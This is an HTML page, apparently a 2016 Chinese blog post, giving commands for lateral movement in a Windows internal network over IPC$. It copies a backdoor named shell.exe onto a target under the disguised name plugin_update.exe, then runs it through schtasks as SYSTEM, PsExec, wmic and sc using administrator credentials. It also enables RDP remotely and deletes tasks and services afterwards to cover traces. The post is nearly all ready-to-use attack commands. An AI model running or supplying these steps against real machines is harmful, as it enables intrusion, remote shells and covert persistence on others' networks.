@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="知道自己想要做什么,比怎么做更重要">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="win内网中利用ipc弹shell 小记"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="知道自己想要做什么,比怎么做更重要" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>win内网中利用ipc弹shell 小记 - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    主页
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    所有文章
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    关于自己
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    标签
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    分类
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    一起交流
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/09/24/ipc-reverse-shell/">
+                win内网中利用ipc弹shell 小记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ipc-note/">ipc note</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>先把马拷到目标机器上再说:<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># net use <span class="symbol">\\</span>192.168.3.168<span class="symbol">\i</span>pc$ /user:administrator "admin!@#45"</div><div class="line"># copy shell.exe <span class="symbol">\\</span>192.168.3.168<span class="symbol">\c</span>$<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span class="symbol">\p</span>lugin_update.exe</div></pre></td></tr></table></figure></p>
+<p>1, 常规的copy[xcopy] &amp; schtasks(按说ipc建立以后,schtasks就不用带账号密码了,尤其我这里还是以system权限运行[本身就是不需要账号密码的],但实际测试中不带就拒绝访问,保险起见还是带上):<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># schtasks /create /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /<span class="keyword">tr</span> <span class="keyword">c</span>:\windows\temp\plugin_update.<span class="keyword">exe</span> /sc once /<span class="keyword">st</span> <span class="number">10</span>:<span class="number">29</span> /S <span class="number">192.168</span>.<span class="number">3.168</span> /RU System  /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span> </div><div class="line"># schtasks /run /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /S <span class="number">192.168</span>.<span class="number">3.168</span>  /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span>  你也可以不用等,让目标立即运行任务</div><div class="line"># schtasks /F /<span class="keyword">delete</span> /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /S <span class="number">192.168</span>.<span class="number">3.168</span> /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/schtasks reverse shell head.jpg" alt=""><br><img src="/img/schtasks reverse shell s.jpg" alt=""><br><img src="/img/schtasks reverse shell system.jpg" alt=""><br></p>
+<p>2, 通过psexec的方式(对方admin$开启即可,简单粗暴,退出的时候可能[如果你是用的交互],只是可能会有服务残留,实际测试中并没有,种马的时候注意不要交互,要不然会一直卡在哪里)<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">PsExec</span><span class="selector-class">.exe</span> <span class="selector-tag">-accepteula</span> \\192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.36</span> <span class="selector-tag">-d</span> <span class="selector-tag">-u</span> <span class="selector-tag">administrator</span> <span class="selector-tag">-p</span> <span class="selector-tag">admin</span> <span class="selector-tag">c</span>:\<span class="selector-tag">windows</span>\<span class="selector-tag">temp</span>\<span class="selector-tag">plugin_update</span><span class="selector-class">.exe</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/psexec shell.jpg" alt=""><br></p>
+<p>3, 通过wmic的方式来远程执行任意指令[ 代表工具 winexec ]:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># wmic /node:<span class="number">192.168</span><span class="meta">.3</span><span class="meta">.168</span> /user:administrator /password:admin!@#<span class="number">45</span> process <span class="keyword">call</span> create <span class="string">"c:\windows\temp\plugin_update.exe"</span></div><div class="line"># wmic /node:<span class="number">192.168</span><span class="meta">.3</span><span class="meta">.36</span> /USER:administrator /password:admin PATH win32_terminalservicesetting WHERE (__Class!=<span class="string">""</span>) <span class="keyword">CALL</span> SetAllowTSConnections <span class="number">1</span>  远程开启对方的rdp,<span class="number">08</span>以后的系统可能不太好使</div></pre></td></tr></table></figure></p>
+<p><img src="/img/wmic shell.jpg" alt=""><br></p>
+<p>4,通过sc创建临时服务的方式(记得事先建立好连接,可能需要把exe,bat先注册一下,不然会一直报1053错误(哪位大表哥如果知道怎么更好的解决,还望能告诉小弟一声,感激不尽),但,其实也并不影响,虽然服务报错,但马还是会照常执行(记得shel弹回来以后马上迁徙shell进程,动作要快,不然很快就会断掉),只要shell弹回来就好了,用完就顺手删掉了,关于sc的更多选项请自行查看命令帮助):<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> net use \\192.168.3.168\ipc$ /user:administrator <span class="string">"admin!@#45"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> sc \\192.168.3.168 create <span class="string">"patch_update"</span> binpath= <span class="string">"cmd /c c:\windows\temp\plugin_update.exe"</span>  这里注意下等号后面的空格别漏了</span></div><div class="line"><span class="meta">#</span><span class="bash"> sc \\192.168.3.168 start <span class="string">"patch_update"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> sc \\192.168.3.168 delete <span class="string">"patch_update"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> net use \\192.168.3.168\ipc$ /del</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sc create del.jpg" alt=""><br><br><br></p>
+<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;没啥技术含量,简单记录下,留给有需要的人,搞清楚一些方法的利用前提就好(适合在域中或普通的win内网中)</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/ipc-reverse-shell/">#ipc reverse shell</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klionsec@gmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <h2>blog by klion</h2>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
